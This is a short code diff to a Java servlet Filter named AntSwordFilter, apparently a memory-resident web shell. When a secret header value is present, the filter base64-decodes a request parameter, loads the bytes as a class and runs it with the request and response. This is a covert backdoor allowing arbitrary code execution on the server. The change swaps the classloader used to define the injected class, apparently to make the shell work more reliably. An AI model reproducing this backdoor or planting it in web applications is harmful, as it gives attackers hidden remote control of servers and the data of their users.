@@ -35,7 +35,7 @@ public class AntSwordFilter extends ClassLoader implements Filter {
         try {
             if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                 byte[] bytes = base64Decode(request.getParameter(pass));
-                Object instance = (new AntSwordFilter(this.getClass().getClassLoader())).g(bytes).newInstance();
+                Object instance = (new AntSwordFilter(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                 instance.equals(new Object[]{request, response});
             } else {
                 filterChain.doFilter(servletRequest, servletResponse);
